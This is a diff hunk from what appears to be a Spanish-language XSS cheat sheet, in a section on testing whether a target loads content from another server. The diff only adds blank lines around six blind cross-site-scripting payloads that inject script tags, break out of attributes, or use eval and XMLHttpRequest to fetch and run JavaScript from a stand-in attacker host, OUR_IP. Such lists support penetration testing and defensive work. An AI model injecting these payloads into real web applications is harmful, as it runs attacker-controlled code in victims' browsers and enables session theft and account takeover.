@@ -36,16 +36,22 @@ D
 
 #### Probar si se conecta a otro servidor:
 A
+
         <script src=http://OUR_IP></script>
 B
+
         '><script src=http://OUR_IP></script>
 C
+
         "><script src=http://OUR_IP></script>
 D
+
         javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
 E
+
         <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
 F
+
         <script>$.getScript("http://OUR_IP")</script>
 
 
